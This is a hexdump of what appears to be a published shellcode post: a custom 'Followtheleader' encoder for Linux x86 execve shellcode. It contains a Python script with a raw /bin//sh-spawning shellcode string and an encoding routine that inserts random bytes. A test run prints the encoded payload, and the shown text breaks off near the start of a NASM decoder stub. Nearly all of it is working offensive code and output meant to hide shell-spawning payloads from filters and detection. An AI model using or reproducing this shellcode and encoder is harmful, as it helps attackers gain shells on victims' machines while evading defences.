00000000  2f 2a 0a 46 6f 6c 6c 6f  77 74 68 65 6c 65 61 64  |/*.Followthelead|
00000010  65 72 20 63 75 73 74 6f  6d 20 65 78 65 63 76 65  |er custom execve|
00000020  2d 73 68 65 6c 6c 63 6f  64 65 20 45 6e 63 6f 64  |-shellcode Encod|
00000030  65 72 2f 44 65 63 6f 64  65 72 20 20 2d 20 4c 69  |er/Decoder  - Li|
00000040  6e 75 78 20 49 6e 74 65  6c 2f 78 38 36 0a 41 75  |nux Intel/x86.Au|
00000050  74 68 6f 72 3a 20 4b 6f  6e 73 74 61 6e 74 69 6e  |thor: Konstantin|
00000060  6f 73 20 41 6c 65 78 69  6f 75 0a 2a 2f 0a 2d 2d  |os Alexiou.*/.--|
00000070  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000000e0  0a 61 29 50 79 74 68 6f  6e 20 73 63 72 69 70 74  |.a)Python script|
000000f0  2e 20 45 6e 63 6f 64 65  72 20 66 6f 72 20 73 68  |. Encoder for sh|
00000100  65 6c 6c 63 6f 64 65 20  28 65 78 65 63 76 65 29  |ellcode (execve)|
00000110  0a 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.---------------|
00000120  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000180  2d 2d 2d 0a 23 21 2f 75  73 72 2f 62 69 6e 2f 70  |---.#!/usr/bin/p|
00000190  79 74 68 6f 6e 0a 23 20  41 75 74 68 6f 72 3a 4b  |ython.# Author:K|
000001a0  6f 6e 73 74 61 6e 74 69  6e 6f 73 20 41 6c 65 78  |onstantinos Alex|
000001b0  69 6f 75 20 20 0a 23 20  45 6e 63 6f 64 69 6e 67  |iou  .# Encoding|
000001c0  20 6e 61 6d 65 3a 20 46  6f 6c 6c 6f 77 74 68 65  | name: Followthe|
000001d0  6c 65 61 64 65 72 2d 65  6e 63 6f 64 65 72 0a 23  |leader-encoder.#|
000001e0  20 44 65 73 63 72 69 70  74 69 6f 6e 3a 20 43 75  | Description: Cu|
000001f0  73 74 6f 6d 20 65 78 65  63 76 65 2d 73 68 65 6c  |stom execve-shel|
00000200  6c 63 6f 64 65 20 65 6e  63 6f 64 65 72 20 62 61  |lcode encoder ba|
00000210  73 65 64 20 6f 6e 20 61  20 67 69 76 65 6e 20 72  |sed on a given r|
00000220  61 6e 64 6f 6d 20 62 79  74 65 20 77 68 69 63 68  |andom byte which|
00000230  20 69 73 20 75 73 65 64  20 74 6f 20 65 6e 63 6f  | is used to enco|
00000240  64 65 20 74 68 65 20 65  78 65 63 76 65 20 73 68  |de the execve sh|
00000250  65 6c 6c 63 6f 64 65 0a  69 6d 70 6f 72 74 20 72  |ellcode.import r|
00000260  61 6e 64 6f 6d 0a 69 6d  70 6f 72 74 20 73 79 73  |andom.import sys|
00000270  0a 73 68 65 6c 6c 63 6f  64 65 20 3d 28 27 5c 78  |.shellcode =('\x|
00000280  33 31 5c 78 63 30 5c 78  35 30 5c 78 36 38 5c 78  |31\xc0\x50\x68\x|
00000290  32 66 5c 78 32 66 5c 78  37 33 5c 78 36 38 5c 78  |2f\x2f\x73\x68\x|
000002a0  36 38 5c 78 32 66 5c 78  36 32 5c 78 36 39 5c 78  |68\x2f\x62\x69\x|
000002b0  36 65 5c 78 38 39 5c 78  65 33 5c 78 35 30 5c 78  |6e\x89\xe3\x50\x|
000002c0  38 39 5c 78 65 32 5c 78  35 33 5c 78 38 39 5c 78  |89\xe2\x53\x89\x|
000002d0  65 31 5c 78 62 30 5c 78  30 62 5c 78 63 64 5c 78  |e1\xb0\x0b\xcd\x|
000002e0  38 30 27 29 0a 74 6f 74  61 6c 20 3d 20 6c 65 6e  |80').total = len|
000002f0  28 73 79 73 2e 61 72 67  76 29 0a 69 66 20 74 6f  |(sys.argv).if to|
00000300  74 61 6c 20 21 3d 20 32  3a 0a 20 20 20 20 20 20  |tal != 2:.      |
00000310  20 20 70 72 69 6e 74 20  27 21 21 47 69 76 65 20  |  print '!!Give |
00000320  74 68 65 20 4c 45 41 44  45 52 20 62 79 74 65 27  |the LEADER byte'|
00000330  20 0a 20 20 20 20 20 20  20 20 70 72 69 6e 74 20  | .        print |
00000340  27 53 63 72 69 70 74 20  6d 75 73 74 20 72 75 6e  |'Script must run|
00000350  20 61 73 3a 20 70 79 74  68 6f 6e 20 78 78 78 2e  | as: python xxx.|
00000360  70 79 20 4c 45 41 44 45  52 27 0a 20 20 20 20 20  |py LEADER'.     |
00000370  20 20 20 70 72 69 6e 74  20 27 4c 45 41 44 45 52  |   print 'LEADER|
00000380  20 69 73 20 61 6e 79 20  69 6e 74 65 67 65 72 20  | is any integer |
00000390  62 65 74 77 65 65 6e 20  31 37 2d 32 35 35 27 0a  |between 17-255'.|
000003a0  20 20 20 20 20 20 20 20  70 72 69 6e 74 20 27 65  |        print 'e|
000003b0  2e 67 20 20 70 79 74 68  6f 6e 20 46 6f 6c 6c 6f  |.g  python Follo|
000003c0  77 74 68 65 6c 65 61 64  65 72 2e 70 79 20 33 32  |wtheleader.py 32|
000003d0  27 0a 65 6c 73 65 3a 0a  20 20 20 20 74 72 79 3a  |'.else:.    try:|
000003e0  0a 20 20 20 20 20 20 20  20 6c 65 61 64 65 72 20  |.        leader |
000003f0  3d 20 69 6e 74 28 73 79  73 2e 61 72 67 76 5b 31  |= int(sys.argv[1|
00000400  5d 29 0a 20 20 20 20 20  20 20 20 66 62 20 3d 20  |]).        fb = |
00000410  69 6e 74 28 68 65 78 28  6c 65 61 64 65 72 29 5b  |int(hex(leader)[|
00000420  32 3a 33 5d 2c 31 36 29  20 20 20 20 20 20 20 20  |2:3],16)        |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 23 20 53  |             # S|
00000450  70 6c 69 74 20 74 68 65  20 4c 45 41 44 45 52 2e  |plit the LEADER.|
00000460  20 49 66 20 6c 65 61 64  65 72 20 3d 20 41 46 20  | If leader = AF |
00000470  2d 2d 3e 66 62 3d 41 0a  20 20 20 20 20 20 20 20  |-->fb=A.        |
00000480  73 62 20 3d 20 69 6e 74  28 68 65 78 28 6c 65 61  |sb = int(hex(lea|
00000490  64 65 72 29 5b 33 3a 5d  2c 31 36 29 20 20 20 20  |der)[3:],16)    |
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000004c0  20 20 23 20 53 70 6c 69  74 20 74 68 65 20 4c 45  |  # Split the LE|
000004d0  41 44 45 52 2e 20 49 66  20 4c 45 41 44 45 52 20  |ADER. If LEADER |
000004e0  3d 20 41 46 20 2d 2d 3e  73 62 3d 46 0a 20 20 20  |= AF -->sb=F.   |
000004f0  20 20 20 20 20 65 6e 63  6f 64 65 64 20 3d 20 27  |     encoded = '|
00000500  20 27 0a 20 20 20 20 20  20 20 20 65 6e 63 6f 64  | '.        encod|
00000510  65 64 32 20 3d 20 27 20  27 20 0a 20 20 20 20 20  |ed2 = ' ' .     |
00000520  20 20 20 65 6e 63 6f 64  65 64 20 3d 20 27 5c 5c  |   encoded = '\\|
00000530  78 27 0a 20 20 20 20 20  20 20 20 65 6e 63 6f 64  |x'.        encod|
00000540  65 64 20 2b 3d 20 68 65  78 28 6c 65 61 64 65 72  |ed += hex(leader|
00000550  29 5b 32 3a 5d 20 20 20  20 20 20 20 20 20 20 20  |)[2:]           |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 23 20 46  |             # F|
00000580  49 52 53 54 20 62 79 74  65 20 74 68 65 20 4c 45  |IRST byte the LE|
00000590  41 44 45 52 20 0a 20 20  20 20 20 20 20 20 65 6e  |ADER .        en|
000005a0  63 6f 64 65 64 32 20 3d  20 27 30 78 27 0a 20 20  |coded2 = '0x'.  |
000005b0  20 20 20 20 20 20 65 6e  63 6f 64 65 64 32 20 2b  |      encoded2 +|
000005c0  3d 20 68 65 78 28 6c 65  61 64 65 72 29 5b 32 3a  |= hex(leader)[2:|
000005d0  5d 0a 20 20 20 20 20 20  20 20 69 3d 30 0a 20 20  |].        i=0.  |
000005e0  20 20 20 20 20 20 66 6f  72 20 78 20 69 6e 20 62  |      for x in b|
000005f0  79 74 65 61 72 72 61 79  28 73 68 65 6c 6c 63 6f  |ytearray(shellco|
00000600  64 65 29 3a 20 20 20 20  20 20 20 20 20 20 20 20  |de):            |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000620  20 20 20 20 20 20 20 20  23 20 52 45 41 44 20 65  |        # READ e|
00000630  76 65 72 79 20 49 6e 73  74 72 75 63 74 69 6f 6e  |very Instruction|
00000640  20 61 73 20 42 59 54 45  20 20 0a 20 20 20 20 20  | as BYTE  .     |
00000650  20 20 20 20 20 20 20 20  20 20 20 69 20 2b 3d 31  |           i +=1|
00000660  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000670  20 68 6f 70 63 6f 64 65  20 3d 20 27 25 30 32 78  | hopcode = '%02x|
00000680  27 20 25 78 20 20 20 20  20 20 20 20 20 20 20 20  |' %x            |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006a0  20 20 20 20 20 20 20 20  20 20 20 23 20 4b 45 45  |           # KEE|
000006b0  50 20 6f 6e 6c 79 20 74  68 65 20 48 45 58 20 76  |P only the HEX v|
000006c0  61 6c 75 65 20 6f 66 20  6f 70 63 6f 64 65 0a 20  |alue of opcode. |
000006d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 44  |               D|
000006e0  65 63 5f 68 6f 70 63 6f  64 65 20 3d 20 69 6e 74  |ec_hopcode = int|
000006f0  28 68 6f 70 63 6f 64 65  2c 20 31 36 29 20 20 20  |(hopcode, 16)   |
00000700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000710  20 20 20 20 20 20 20 20  20 23 20 43 41 4c 43 55  |         # CALCU|
00000720  4c 41 54 45 20 74 68 65  20 44 45 43 49 4d 41 4c  |LATE the DECIMAL|
00000730  20 76 61 6c 75 65 20 6f  66 20 6f 70 63 6f 64 65  | value of opcode|
00000740  20 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | .              |
00000750  20 20 73 75 70 6c 58 20  3d 20 32 35 35 20 2d 20  |  suplX = 255 - |
00000760  44 65 63 5f 68 6f 70 63  6f 64 65 20 20 20 20 20  |Dec_hopcode     |
00000770  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000780  20 20 20 20 20 20 20 20  20 20 20 20 23 20 43 41  |            # CA|
00000790  4c 43 55 4c 41 54 45 20  74 68 65 20 53 55 50 50  |LCULATE the SUPP|
000007a0  4c 45 4d 45 4e 54 20 0a  20 20 20 20 20 20 20 20  |LEMENT .        |
000007b0  20 20 20 20 20 20 20 20  72 65 76 5f 73 75 70 6c  |        rev_supl|
000007c0  78 20 3d 20 68 65 78 28  73 75 70 6c 58 29 5b 3a  |x = hex(suplX)[:|
000007d0  3a 2d 31 5d 20 20 20 20  20 20 20 20 20 20 20 20  |:-1]            |
000007e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007f0  20 20 23 20 52 45 56 45  52 54 20 74 68 65 20 62  |  # REVERT the b|
00000800  79 74 65 73 20 6f 66 20  53 55 50 50 4c 45 4d 45  |ytes of SUPPLEME|
00000810  4e 54 20 28 61 65 20 2d  2d 3e 20 65 61 29 0a 20  |NT (ae --> ea). |
00000820  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 73  |               s|
00000830  75 62 66 73 20 3d 20 66  62 2d 73 62 20 20 20 20  |ubfs = fb-sb    |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000850  20 20 20 20 0a 23 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |    .#----------|
00000860  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000870  2d 2d 54 68 65 20 45 6e  63 6f 64 65 64 20 62 79  |--The Encoded by|
00000880  74 65 20 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |te -------------|
00000890  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000008b0  2d 2d 2d 2d 2d 2d 2d 0a  20 20 20 20 20 20 20 20  |-------.        |
000008c0  20 20 20 20 20 20 20 20  78 78 78 20 3d 20 68 65  |        xxx = he|
000008d0  78 28 69 6e 74 28 61 62  73 28 73 75 62 66 73 29  |x(int(abs(subfs)|
000008e0  29 20 2b 20 69 6e 74 28  72 65 76 5f 73 75 70 6c  |) + int(rev_supl|
000008f0  78 5b 30 3a 32 5d 2c 31  36 29 29 0a 23 2d 2d 2d  |x[0:2],16)).#---|
00000900  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000950  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0a 20  |--------------. |
00000960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 69  |               i|
00000970  66 20 6c 65 6e 28 78 78  78 29 3e 34 3a 20 20 20  |f len(xxx)>4:   |
00000980  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000009a0  20 20 20 20 20 20 20 20  20 23 20 43 68 65 63 6b  |         # Check|
000009b0  20 69 66 20 78 78 78 20  3e 20 30 78 66 66 0a 20  | if xxx > 0xff. |
000009c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009d0  20 20 20 20 20 20 20 70  72 69 6e 74 20 27 4f 76  |       print 'Ov|
000009e0  65 72 66 6c 6f 77 20 65  6e 63 6f 64 69 6e 67 2e  |erflow encoding.|
000009f0  54 72 79 20 61 67 61 69  6e 21 21 21 2e 27 0a 20  |Try again!!!.'. |
00000a00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a10  20 20 20 20 20 20 20 73  79 73 2e 65 78 69 74 28  |       sys.exit(|
00000a20  29 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |).              |
00000a30  20 20 65 6c 69 66 20 78  78 78 20 3d 3d 20 27 30  |  elif xxx == '0|
00000a40  78 30 27 3a 20 20 20 20  20 20 20 20 20 20 20 20  |x0':            |
00000a50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a60  20 20 20 20 20 20 20 20  20 20 20 20 23 20 43 68  |            # Ch|
00000a70  65 63 6b 20 69 66 20 5a  45 52 4f 20 62 79 74 65  |eck if ZERO byte|
00000a80  20 77 61 73 20 65 6e 63  6f 64 65 64 20 0a 20 20  | was encoded .  |
00000a90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000aa0  20 20 20 20 20 20 70 72  69 6e 74 20 27 41 20 62  |      print 'A b|
00000ab0  79 74 65 20 77 61 73 20  45 6e 63 6f 64 65 64 20  |yte was Encoded |
00000ac0  61 73 20 30 78 30 30 20  2e 54 72 79 20 61 67 61  |as 0x00 .Try aga|
00000ad0  69 6e 21 21 21 27 0a 20  20 20 20 20 20 20 20 20  |in!!!'.         |
00000ae0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 73  |               s|
00000af0  79 73 2e 65 78 69 74 28  29 0a 20 20 20 20 20 20  |ys.exit().      |
00000b00  20 20 20 20 20 20 20 20  20 20 65 6e 63 6f 64 65  |          encode|
00000b10  64 20 2b 3d 20 20 27 5c  5c 78 27 20 20 20 20 20  |d +=  '\\x'     |
00000b20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000b40  20 20 20 20 23 20 50 75  74 20 5c 78 20 66 69 72  |    # Put \x fir|
00000b50  73 74 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |st.             |
00000b60  20 20 20 65 6e 63 6f 64  65 64 20 2b 3d 20 20 78  |   encoded +=  x|
00000b70  78 78 5b 32 3a 5d 20 20  20 20 20 20 20 20 20 20  |xx[2:]          |
00000b80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b90  20 20 20 20 20 20 20 20  20 20 20 20 20 23 20 50  |             # P|
00000ba0  75 74 20 74 68 65 20 78  78 78 20 61 66 74 65 72  |ut the xxx after|
00000bb0  77 61 72 64 73 0a 20 20  20 20 20 20 20 20 20 20  |wards.          |
00000bc0  20 20 20 20 20 20 69 6e  73 65 72 74 42 79 74 65  |      insertByte|
00000bd0  20 3d 20 68 65 78 28 72  61 6e 64 6f 6d 2e 72 61  | = hex(random.ra|
00000be0  6e 64 69 6e 74 28 31 2c  32 35 35 29 29 20 20 20  |ndint(1,255))   |
00000bf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c00  23 20 50 75 74 20 61 20  52 61 6e 64 6f 6d 20 62  |# Put a Random b|
00000c10  79 74 65 20 0a 20 20 20  20 20 20 20 20 20 20 20  |yte .           |
00000c20  20 20 20 20 20 65 6e 63  6f 64 65 64 20 2b 3d 20  |     encoded += |
00000c30  27 5c 5c 78 27 20 20 20  20 20 20 20 20 20 20 20  |'\\x'           |
00000c40  20 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | .              |
00000c50  20 20 65 6e 63 6f 64 65  64 20 2b 3d 20 69 6e 73  |  encoded += ins|
00000c60  65 72 74 42 79 74 65 5b  32 3a 5d 20 20 20 0a 20  |ertByte[2:]   . |
00000c70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 69  |               i|
00000c80  20 2b 3d 31 0a 20 20 20  20 20 20 20 20 20 20 20  | +=1.           |
00000c90  20 20 20 20 20 65 6e 63  6f 64 65 64 32 20 2b 3d  |     encoded2 +=|
00000ca0  20 27 2c 27 0a 20 20 20  20 20 20 20 20 20 20 20  | ','.           |
00000cb0  20 20 20 20 20 65 6e 63  6f 64 65 64 32 20 2b 3d  |     encoded2 +=|
00000cc0  20 78 78 78 20 0a 20 20  20 20 20 20 20 20 20 20  | xxx .          |
00000cd0  20 20 20 20 20 20 65 6e  63 6f 64 65 64 32 20 2b  |      encoded2 +|
00000ce0  3d 20 27 2c 27 20 20 20  20 20 20 20 20 20 20 20  |= ','           |
00000cf0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000d00  20 65 6e 63 6f 64 65 64  32 20 2b 3d 20 27 30 78  | encoded2 += '0x|
00000d10  27 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |'.              |
00000d20  20 20 65 6e 63 6f 64 65  64 32 20 2b 3d 20 69 6e  |  encoded2 += in|
00000d30  73 65 72 74 42 79 74 65  5b 32 3a 5d 0a 20 20 20  |sertByte[2:].   |
00000d40  20 20 20 20 20 70 72 69  6e 74 20 27 20 2a 2a 2a  |     print ' ***|
00000d50  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 27 3b 0a 20 20 20  |**********';.   |
00000d60  20 20 20 20 20 70 72 69  6e 74 20 27 20 4c 45 41  |     print ' LEA|
00000d70  44 45 52 20 42 59 54 45  20 3a 64 65 63 69 6d 61  |DER BYTE :decima|
00000d80  6c 28 25 64 29 2c 20 48  45 58 28 30 78 25 78 29  |l(%d), HEX(0x%x)|
00000d90  27 20 20 25 28 69 6e 74  28 73 79 73 2e 61 72 67  |'  %(int(sys.arg|
00000da0  76 5b 31 5d 29 2c 6c 65  61 64 65 72 29 0a 20 20  |v[1]),leader).  |
00000db0  20 20 20 20 20 20 70 72  69 6e 74 20 27 20 2a 2a  |      print ' **|
00000dc0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 27 3b 0a 20 20  |***********';.  |
00000dd0  20 20 20 20 20 20 70 72  69 6e 74 20 27 4c 65 6e  |      print 'Len|
00000de0  20 6f 66 20 53 68 65 6c  6c 63 6f 64 65 3a 20 25  | of Shellcode: %|
00000df0  30 32 64 27 20 25 20 69  0a 20 20 20 20 20 20 20  |02d' % i.       |
00000e00  20 70 72 69 6e 74 20 27  2d 2d 2d 2d 2d 2d 2d 2d  | print '--------|
00000e10  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000e50  27 3b 0a 20 20 20 20 20  20 20 20 70 72 69 6e 74  |';.        print|
00000e60  20 27 20 20 20 31 2e 20  53 74 79 6c 65 3a 3d 20  | '   1. Style:= |
00000e70  25 73 20 27 20 25 20 65  6e 63 6f 64 65 64 0a 20  |%s ' % encoded. |
00000e80  20 20 20 20 20 20 20 70  72 69 6e 74 20 27 2d 2d  |       print '--|
00000e90  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000ed0  2d 2d 2d 2d 2d 2d 27 3b  0a 20 20 20 20 20 20 20  |------';.       |
00000ee0  20 70 72 69 6e 74 20 27  20 20 20 32 2e 20 53 74  | print '   2. St|
00000ef0  79 6c 65 3a 3d 20 25 73  20 27 20 25 20 65 6e 63  |yle:= %s ' % enc|
00000f00  6f 64 65 64 32 0a 20 20  20 20 20 20 20 20 70 72  |oded2.        pr|
00000f10  69 6e 74 20 27 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |int '-----------|
00000f20  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000f50  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 27 3b 0a  |-------------';.|
00000f60  20 20 20 20 65 78 63 65  70 74 3a 0a 20 20 20 20  |    except:.    |
00000f70  20 20 20 20 70 72 69 6e  74 20 22 65 78 69 74 69  |    print "exiti|
00000f80  6e 67 2e 2e 2e 22 0a 2d  2d 2d 2d 2d 2d 2d 2d 2d  |ng...".---------|
00000f90  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000fd0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0a 46  |--------------.F|
00000fe0  6f 6c 6c 6f 77 74 68 65  6c 65 61 64 65 72 20 45  |ollowtheleader E|
00000ff0  6e 63 6f 64 65 72 20 74  65 73 74 20 72 75 6e 20  |ncoder test run |
00001000  3a 0a 24 20 70 79 74 68  6f 6e 20 46 6f 6c 6c 6f  |:.$ python Follo|
00001010  77 74 68 65 6c 65 61 64  65 72 2d 65 6e 63 6f 64  |wtheleader-encod|
00001020  65 72 2e 70 79 20 36 37  0a 20 2a 2a 2a 2a 2a 2a  |er.py 67. ******|
00001030  2a 2a 2a 2a 2a 2a 2a 0a  20 4c 45 41 44 45 52 20  |*******. LEADER |
00001040  42 59 54 45 20 3a 64 65  63 69 6d 61 6c 28 36 37  |BYTE :decimal(67|
00001050  29 2c 20 48 45 58 28 30  78 34 33 29 0a 20 2a 2a  |), HEX(0x43). **|
00001060  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 0a 4c 65 6e 20  |***********.Len |
00001070  6f 66 20 53 68 65 6c 6c  63 6f 64 65 3a 20 35 30  |of Shellcode: 50|
00001080  0a 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.---------------|
00001090  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000010c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 0a 20 20 20 31 2e 20  |---------.   1. |
000010d0  53 74 79 6c 65 3a 3d 20  5c 78 34 33 5c 78 65 64  |Style:= \x43\xed|
000010e0  5c 78 31 64 5c 78 66 34  5c 78 34 30 5c 78 66 62  |\x1d\xf4\x40\xfb|
000010f0  5c 78 36 66 5c 78 37 61  5c 78 61 39 5c 78 65 5c  |\x6f\x7a\xa9\xe\|
00001100  78 62 36 5c 78 65 5c 78  62 63 5c 78 63 39 5c 78  |xb6\xe\xbc\xc9\x|
00001110  65 33 5c 78 37 61 5c 78  61 66 5c 78 37 61 5c 78  |e3\x7a\xaf\x7a\x|
00001120  37 38 0a 5c 78 65 5c 78  63 35 5c 78 64 61 5c 78  |78.\xe\xc5\xda\x|
00001130  37 36 5c 78 36 61 5c 78  31 37 5c 78 31 61 5c 78  |76\x6a\x17\x1a\x|
00001140  34 65 5c 78 36 38 5c 78  33 38 5c 78 63 32 5c 78  |4e\x68\x38\xc2\x|
00001150  39 39 5c 78 66 62 5c 78  33 35 5c 78 36 38 5c 78  |99\xfb\x35\x68\x|
00001160  38 34 5c 78 64 32 5c 78  62 33 5c 78 63 62 5c 78  |84\xd2\xb3\xcb\x|
00001170  37 63 5c 78 36 38 5c 78  37 38 0a 5c 78 65 32 5c  |7c\x68\x78.\xe2\|
00001180  78 39 61 5c 78 66 35 5c  78 65 39 5c 78 35 30 5c  |x9a\xf5\xe9\x50\|
00001190  78 63 30 5c 78 32 34 5c  78 39 31 5c 78 66 38 5c  |xc0\x24\x91\xf8\|
000011a0  78 66 65 20 0a 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |xfe .-----------|
000011b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000011e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 20 20  |-------------.  |
000011f0  20 32 2e 20 53 74 79 6c  65 3a 3d 20 30 78 34 33  | 2. Style:= 0x43|
00001200  2c 30 78 65 64 2c 30 78  31 64 2c 30 78 66 34 2c  |,0xed,0x1d,0xf4,|
00001210  30 78 34 30 2c 30 78 66  62 2c 30 78 36 66 2c 30  |0x40,0xfb,0x6f,0|
00001220  78 37 61 2c 30 78 61 39  2c 30 78 65 2c 30 78 62  |x7a,0xa9,0xe,0xb|
00001230  36 2c 30 78 65 2c 30 78  62 63 2c 30 78 63 39 2c  |6,0xe,0xbc,0xc9,|
00001240  30 78 65 33 2c 0a 30 78  37 61 2c 30 78 61 66 2c  |0xe3,.0x7a,0xaf,|
00001250  30 78 37 61 2c 30 78 37  38 2c 30 78 65 2c 30 78  |0x7a,0x78,0xe,0x|
00001260  63 35 2c 30 78 64 61 2c  30 78 37 36 2c 30 78 36  |c5,0xda,0x76,0x6|
00001270  61 2c 30 78 31 37 2c 30  78 31 61 2c 30 78 34 65  |a,0x17,0x1a,0x4e|
00001280  2c 30 78 36 38 2c 30 78  33 38 2c 30 78 63 32 2c  |,0x68,0x38,0xc2,|
00001290  30 78 39 39 2c 30 78 66  62 2c 30 78 33 35 2c 0a  |0x99,0xfb,0x35,.|
000012a0  30 78 36 38 2c 30 78 38  34 2c 30 78 64 32 2c 30  |0x68,0x84,0xd2,0|
000012b0  78 62 33 2c 30 78 63 62  2c 30 78 37 63 2c 30 78  |xb3,0xcb,0x7c,0x|
000012c0  36 38 2c 30 78 37 38 2c  30 78 65 32 2c 30 78 39  |68,0x78,0xe2,0x9|
000012d0  61 2c 30 78 66 35 2c 30  78 65 39 2c 30 78 35 30  |a,0xf5,0xe9,0x50|
000012e0  2c 30 78 63 30 2c 30 78  32 34 2c 30 78 39 31 2c  |,0xc0,0x24,0x91,|
000012f0  30 78 66 38 2c 30 78 66  65 20 0a 2d 2d 2d 2d 2d  |0xf8,0xfe .-----|
00001300  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001340  2d 2d 2d 0a 62 29 20 44  65 63 6f 64 65 72 20 66  |---.b) Decoder f|
00001350  6f 72 20 74 68 65 20 65  6e 63 6f 64 65 64 20 73  |or the encoded s|
00001360  68 65 6c 6c 63 6f 64 65  20 28 65 78 65 63 76 65  |hellcode (execve|
00001370  2d 73 74 61 63 6b 29 0a  2d 2d 2d 2d 2d 2d 2d 2d  |-stack).--------|
00001380  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000013c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 0a  |---------------.|
000013d0  24 20 63 61 74 20 46 6f  6c 6c 6f 77 74 68 65 6c  |$ cat Followthel|
000013e0  65 61 64 65 72 2d 64 65  63 6f 64 65 72 2e 6e 61  |eader-decoder.na|
000013f0  73 6d 20 0a 3b 20 46 69  6c 65 6e 61 6d 65 3a 20  |sm .; Filename: |
00001400  46 6f 6c 6c 6f 77 74 68  65 6c 65 61 64 65 72 2d  |Followtheleader-|
00001410  64 65 63 6f 64 65 72 2e  6e 61 73 6d 0a 3b 20 41  |decoder.nasm.; A|
00001420  75 74 68 6f 72 3a 20 20  4b 6f 6e 73 74 61 6e 74  |uthor:  Konstant|
00001430  69 6e 6f 73 20 41 6c 65  78 69 6f 75 0a 3b 20 44  |inos Alexiou.; D|
00001440  65 73 63 72 69 70 74 69  6f 6e 3a 20 46 6f 6c 6c  |escription: Foll|
00001450  6f 77 74 68 65 6c 65 61  64 65 72 20 63 75 73 74  |owtheleader cust|
00001460  6f 6d 20 69 6e 73 65 72  74 69 6f 6e 20 45 6e 63  |om insertion Enc|
00001470  6f 64 65 72 2c 20 4c 69  6e 75 78 20 49 6e 74 65  |oder, Linux Inte|
00001480  6c 2f 78 38 36 0a 20 0a  67 6c 6f 62 61 6c 20 5f  |l/x86. .global _|
00001490  73 74 61 72 74 20 20 20  20 20 20 20 20 20 20 20  |start           |
000014a0  0a 73 65 63 74 69 6f 6e  20 2e 74 65 78 74 0a 20  |.section .text. |
000014b0  0a 5f 73 74 61 72 74 3a  0a 20 20 20 20 6a 6d 70  |._start:.    jmp|
